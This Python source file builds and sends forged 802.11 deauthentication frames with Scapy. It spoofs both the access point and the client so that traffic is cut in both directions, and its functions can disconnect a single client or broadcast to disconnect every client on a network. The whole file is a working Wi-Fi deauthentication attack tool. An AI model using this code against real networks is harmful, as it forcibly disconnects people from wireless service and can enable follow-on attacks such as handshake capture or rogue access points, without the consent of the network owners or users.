import time

from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.all import sendp

from constants import BROADCAST, DEAUTH_PACKET_COUNT
from channel import set_channel


def get_bidirectional_deauth_packets(bssid, client):
    # kick
    dot11_kick = Dot11(type=0, subtype=12, 
                       addr1=client,  # dst (client)
                       addr2=bssid,   # src (AP)
                       addr3=bssid)   # bssid
    pkt_kick = RadioTap() / dot11_kick / Dot11Deauth(reason=7)

    # quit
    dot11_quit = Dot11(type=0, subtype=12, 
                       addr1=bssid,   # dst (AP)
                       addr2=client,  # src (client)
                       addr3=bssid)   # bssid
    pkt_quit = RadioTap() / dot11_quit / Dot11Deauth(reason=7)

    return [pkt_kick, pkt_quit]


def send_deauth_to_client(interface, bssid, client, channel, count):
    set_channel(interface, channel)
    packets = get_bidirectional_deauth_packets(bssid, client)
    for _ in range(1):
        print(f'Sending {DEAUTH_PACKET_COUNT} deauth packets to {client} on {bssid}.')
        sendp(packets, iface=interface, count=DEAUTH_PACKET_COUNT, inter=0.05)
        # time.sleep(0.2)


def send_deauth_to_all(interface, bssid, channel, count):
    set_channel(interface, channel)
    packets = get_bidirectional_deauth_packets(bssid, BROADCAST)
    for _ in range(count):
        print(f'Sending {DEAUTH_PACKET_COUNT} deauth packets to ALL on {bssid}.')
        sendp(packets, iface=interface, count=DEAUTH_PACKET_COUNT)
        time.sleep(0.2)
